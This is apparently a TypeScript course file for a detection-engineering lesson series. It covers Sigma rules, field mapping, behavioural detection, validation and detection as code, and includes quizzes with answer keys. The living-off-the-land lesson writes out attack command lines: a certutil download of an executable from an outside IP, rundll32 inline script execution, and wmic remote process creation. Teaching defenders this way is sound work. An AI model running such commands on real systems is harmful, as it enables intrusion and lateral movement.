/**
 * Detection Engineering Essentials — full lesson content.
 */

import { type Course, lesson, text, code, callout, check } from "./blocks";

export const DETECTION_ENGINEERING: Course = {
  slug: "detection-engineering-essentials",
  modules: [
    {
      title: "Rule anatomy",
      description: "How a detection is put together and which part decides a match.",
      lessons: [
        lesson(
          "Log sources and field mapping",
          "Why the same rule behaves differently across two SIEMs.",
          8,
          [
            text(
              "A detection rule is written against fields, and fields are named differently by every product. The same Windows process-creation event is `process.command_line` in one platform, `CommandLine` in another and `process_command_line` in a third.\n\nThis is why a rule that works perfectly in one estate silently matches nothing in another. The logic is fine; the field does not exist, so the condition is never true.",
            ),
            code(
              `Sigma (portable)          Elastic ECS              Splunk CIM
─────────────────         ────────────────────     ─────────────────
Image                     process.executable       Processes.process_path
CommandLine               process.command_line     Processes.process
ParentImage               process.parent.executable Processes.parent_process_path
User                      user.name                Processes.user`,
              "text",
              "One event, three vocabularies.",
            ),
            callout(
              "danger",
              "A rule matching nothing looks identical to a quiet environment",
              "There is no error when a field does not exist — the condition is simply never satisfied. Validate every new rule against known-bad data before trusting its silence.",
            ),
            check(
              "A rule ported from another organisation produces no alerts in three months. What should you check first?",
              [
                "Whether the attack technique is used in your sector",
                "Whether the fields it references exist and are populated in your data",
                "Whether analysts are closing the alerts silently",
                "Whether the rule needs a higher severity",
              ],
              1,
              "Silence from a ported rule is far more often a field-mapping problem than an absence of the behaviour. Test against known-bad data to distinguish the two.",
            ),
          ],
        ),
        lesson(
          "Detection logic and conditions",
          "Selections, filters and the condition that ties them together.",
          10,
          [
            text(
              "Most detection languages share a structure: named **selections** that describe what you are looking for, optional **filters** describing known-benign matches, and a **condition** that combines them.\n\nThe condition is the part that decides. Everything else is set-up.",
            ),
            code(
              `title: Office spawning a command interpreter
logsource:
  category: process_creation
  product: windows

detection:
  selection:
    ParentImage|endswith:
      - '\\WINWORD.EXE'
      - '\\EXCEL.EXE'
      - '\\POWERPNT.EXE'
    Image|endswith:
      - '\\powershell.exe'
      - '\\cmd.exe'
      - '\\wscript.exe'

  filter_known_addin:
    CommandLine|contains: 'CorpTemplateSync'

  condition: selection and not filter_known_addin

falsepositives:
  - Corporate template add-in (filtered above)
level: high`,
              "text",
              "A complete rule. Note that the exclusion is documented rather than hidden.",
            ),
            text(
              "Two habits separate durable rules from brittle ones. First, **filter narrowly** — this rule excludes one specific command line, not every PowerShell launch. Second, **document the false positive** so the next engineer understands why the exclusion exists and can tell when it stops being valid.",
            ),
            check(
              "Which change would most weaken this rule?",
              [
                "Adding wscript.exe to the selection",
                "Broadening the filter to exclude all PowerShell with any -Command argument",
                "Adding a falsepositives note",
                "Raising the level to critical",
              ],
              1,
              "That filter would exclude most of what the rule exists to catch. Broad exclusions are the usual way a rule quietly stops working while still appearing deployed.",
            ),
          ],
        ),
        lesson(
          "Metadata that matters",
          "Severity, false positives and the response guidance analysts actually read.",
          8,
          [
            text(
              "Rule metadata is treated as paperwork and is actually the difference between a detection that gets actioned and one that gets closed. An analyst at 03:00 has your title, your severity and — if you wrote one — your response guidance.\n\nA title should say what happened, not what fired. 'Suspicious PowerShell' tells nobody anything. 'Office application spawned PowerShell with encoded command' tells them what to check.",
            ),
            callout(
              "important",
              "Severity is a promise about response",
              "If everything is high, nothing is. Severity should map to what you want the analyst to actually do, and you should be willing to defend waking someone up for anything marked critical.",
            ),
            code(
              `Weak
  title: Suspicious PowerShell
  level: high

Better
  title: Office application spawned PowerShell with encoded command
  level: high
  falsepositives:
    - CorpTemplateSync add-in, filtered in the rule
  response: |
    1. Confirm the parent document and where it came from
    2. Decode the -enc argument
    3. Check for outbound connections from the child process
    4. Escalate to IR if the payload contacts an external host`,
              "text",
              "The second version tells an analyst at 03:00 what to do.",
            ),
            text(
              "Response guidance is the field most often left blank and most often needed. It does not have to be long: four concrete steps turn an alert from a question into a task, and materially improve the odds that a real detection is acted on rather than closed for lack of time.",
            ),
            check(
              "What most improves the chance an alert is investigated properly?",
              [
                "A higher severity level",
                "A title describing the observed behaviour and concrete first steps to check",
                "More fields in the alert payload",
                "Tagging it with MITRE technique ids",
              ],
              1,
              "Analysts act on clarity. Severity inflation gets ignored, extra fields add noise, and technique tags help reporting more than triage.",
            ),
          ],
        ),
      ],
    },
    {
      title: "Behaviour over indicators",
      description: "Detecting the technique rather than this week's hash.",
      lessons: [
        lesson(
          "Why indicators decay",
          "Infrastructure is cheap to change; tradecraft is not.",
          10,
          [
            text(
              "A hash identifies one build of one payload. Recompiling changes it. A domain costs a few pounds and minutes to register. An IP address is rented by the hour.\n\nAgainst this, the *behaviour* — a document spawning a shell, a service created remotely, credential material read from LSASS — persists because changing it means changing how the operation works, not merely what it is called.",
            ),
            code(
              `Indicator                 Cost to the attacker   Useful lifetime
─────────────────────     ────────────────────   ──────────────
File hash                 Recompile: minutes     Days
Domain                    Register: minutes      Days to weeks
IP address                Rent: minutes          Days
TLS/JA3 fingerprint       Change tooling: days   Weeks to months
Behavioural pattern       Rewrite tradecraft     Months to years`,
              "text",
              "Roughly the Pyramid of Pain, expressed as engineering effort.",
            ),
            callout(
              "tip",
              "Indicators still earn their place",
              "They are cheap, precise and produce almost no false positives while they last. Block them — just do not mistake a feed of them for a detection strategy.",
            ),
            check(
              "A threat report contains 200 hashes, 40 domains and a description of the technique. Which has the longest detection value?",
              [
                "The hashes, being most precise",
                "The technique description, because behaviour is expensive to change",
                "The domains, being reusable across campaigns",
                "All decay at the same rate",
              ],
              1,
              "The appendix decays in days. The narrative describes what the actor does, which survives every rebuild of their infrastructure.",
            ),
          ],
        ),
        lesson(
          "Parent-child process logic",
          "The single most productive behavioural pattern on Windows.",
          10,
          [
            text(
              "Windows software has predictable ancestry. `winword.exe` is started by `explorer.exe`. `svchost.exe` is started by `services.exe`. When that expectation breaks, something has intervened.\n\nThis one idea produces a large share of high-value detections, because so many intrusions begin with a document or a script starting something it has no business starting.",
            ),
            code(
              `Normal                        Suspicious
────────────────────────      ────────────────────────────────
explorer.exe → winword.exe    winword.exe → powershell.exe
services.exe → svchost.exe    powershell.exe → svchost.exe
explorer.exe → chrome.exe     outlook.exe → wscript.exe
                              w3wp.exe → cmd.exe   (web shell)`,
              "text",
            ),
            text(
              "The right-hand column is not proof of compromise — build systems and administrative tooling produce odd chains legitimately. It is an excellent *place to look*, which is what a detection is for.",
            ),
            check(
              "Why is w3wp.exe spawning cmd.exe particularly notable?",
              [
                "w3wp.exe should never create processes",
                "It suggests command execution through the web application, a classic web shell",
                "cmd.exe is deprecated",
                "It indicates a crashed worker process",
              ],
              1,
              "The IIS worker process running a shell means something reached command execution through the web tier — the signature of a web shell.",
            ),
          ],
        ),
        lesson(
          "Detecting living-off-the-land",
          "Finding intrusions that use only built-in tooling.",
          10,
          [
            text(
              "The hardest intrusions to detect introduce nothing. They use `certutil` to download, `rundll32` to execute, `wmic` to move laterally and `bitsadmin` to persist — all signed Microsoft binaries present on every host.\n\nDetection cannot rest on the binary. It has to rest on **how it is being used**, and on whether that use is normal for that host.",
            ),
            code(
              `certutil.exe -urlcache -split -f http://45.87.212.9/p.exe out.exe
   Legitimate purpose: certificate management
   Actual use: HTTP download

rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";eval(...)
   Legitimate purpose: run a DLL export
   Actual use: execute inline script

wmic /node:10.20.1.25 process call create "cmd /c ..."
   Legitimate purpose: remote management
   Actual use: lateral movement`,
              "bash",
            ),
            callout(
              "important",
              "Baseline decides everything here",
              "In an estate where administrators use wmic daily, alerting on wmic is unworkable. In one where they never do, it is one of your best signals. The same rule is excellent or useless depending on the environment.",
            ),
            check(
              "Why is detecting living-off-the-land techniques harder than detecting malware?",
              [
                "The binaries are encrypted",
                "The tools are signed, legitimate and present everywhere, so only usage context distinguishes abuse",
                "They run only in memory",
                "Antivirus cannot scan system binaries",
              ],
              1,
              "There is nothing anomalous about the file itself. The signal lives entirely in how, where and by whom it is being invoked.",
            ),
          ],
        ),
      ],
    },
    {
      title: "Validation and tuning",
      description: "Proving a rule works, and keeping it that way.",
      lessons: [
        lesson(
          "Testing against known-good and known-bad",
          "A rule that has never fired in test is a hypothesis.",
          8,
          [
            text(
              "Every new rule needs two tests. Against **known-bad**, it must fire — otherwise the logic or the field mapping is wrong. Against **known-good**, it must stay silent — otherwise you are about to hand the SOC a noise generator.\n\nSkipping the first is how rules ship broken. Skipping the second is how they get disabled within a week.",
            ),
            callout(
              "tip",
              "Emulate the technique, do not just craft the log line",
              "Hand-writing a matching event proves your regex works. Running the actual technique proves your rule catches what the technique really produces, which is frequently different.",
            ),
            code(
              `Validation checklist for a new rule

  [ ] Fires on emulated execution of the technique
  [ ] Fires on the real technique, not a hand-crafted log line
  [ ] Silent across fourteen days of production data
  [ ] Every referenced field exists and is populated
  [ ] Exclusions documented with their reason
  [ ] Review date set`,
              "text",
            ),
            text(
              "The second box is the one teams skip. Hand-writing a log line that matches your rule proves the syntax is valid; running the actual technique proves the rule matches what that technique really emits — and the two differ more often than expected, because tooling rarely produces exactly the fields a write-up showed.",
            ),
            check(
              "A rule fires correctly against emulated attack data. What remains untested?",
              [
                "Nothing — it is ready to deploy",
                "Its false-positive rate against normal production activity",
                "Whether the technique is relevant",
                "The severity level",
              ],
              1,
              "True-positive capability is only half. Without a false-positive measurement you cannot know whether the SOC can actually carry the rule.",
            ),
          ],
        ),
        lesson(
          "Measuring false-positive rate",
          "Judging a rule against the SOC's actual capacity.",
          8,
          [
            text(
              "A rule producing forty alerts a day is fine in a team of twenty and impossible in a team of two. False-positive rate is meaningless as an absolute number; it is meaningful relative to capacity.\n\nMeasure by running the rule in a non-alerting mode against real production data for a period, then count.",
            ),
            code(
              `Rule: Office spawns command interpreter
Shadow-run: 14 days

Total matches      412
True positives       2   (both genuine phishing)
Benign              410  (398 from CorpTemplateSync add-in)

After filtering the add-in:  14 matches, 2 true positives.
Workable.`,
              "text",
              "One targeted exclusion turned an unusable rule into a good one.",
            ),
            text(
              "Shadow-running is the mechanism: deploy the rule in a mode that records matches without alerting, leave it a fortnight, then read the results. Two weeks catches the weekly and monthly patterns — the Sunday maintenance window, the month-end billing job — that a two-day test never sees at all.",
            ),
            callout(
              "tip",
              "Count distinct sources, not just matches",
              "Four hundred matches from one host is a tuning problem with an easy fix. Four hundred matches from two hundred hosts is a different rule entirely. The raw count hides that distinction completely.",
            ),
            check(
              "A rule produces 400 benign matches a day, 398 from one known application. What is the right response?",
              [
                "Delete the rule",
                "Add a narrow exclusion for that application and re-measure",
                "Lower the severity so analysts ignore it",
                "Suppress the log source",
              ],
              1,
              "One narrow exclusion removes almost all the noise while keeping the coverage. Deleting loses the detection; lowering severity keeps the noise and hides the signal.",
            ),
          ],
        ),
        lesson(
          "Detection as code",
          "Version control, review and rollback for rules.",
          8,
          [
            text(
              "Detections are production logic. Treating them as code brings the practices that already work for software: version control, peer review, automated testing and the ability to roll back a change that turned out badly.\n\nThe alternative — editing rules directly in a SIEM console — leaves no history, no review and no way to answer 'who changed this, and why?' six months later.",
            ),
            callout(
              "important",
              "Set the review date when you deploy",
              "Environments change. A rule perfectly tuned today drifts as the estate evolves, and the drift is invisible unless somebody looks. Schedule that look at the moment you ship.",
            ),
            code(
              `detections/
  windows/
    office_spawns_shell.yml
    dcsync_from_workstation.yml
  tests/
    office_spawns_shell.test.yml    known-bad and known-good samples
  .github/workflows/
    validate.yml                    syntax, field mapping, sample runs`,
              "text",
              "The same layout any engineer would recognise.",
            ),
            text(
              "Continuous integration is where this pays off. A pipeline that checks syntax, confirms referenced fields exist in your schema, and runs each rule against its stored samples catches the broken-rule-that-matches-nothing problem at review time rather than months later during an incident.",
            ),
            check(
              "What is the primary benefit of managing detections in version control?",
              [
                "Rules execute faster",
                "Changes are reviewable, attributable and reversible",
                "It removes the need for testing",
                "It reduces false positives automatically",
              ],
              1,
              "Version control does not improve the rule. It makes the change history knowable, which is what lets a team operate a large ruleset safely.",
            ),
          ],
        ),
      ],
    },
  ],
};
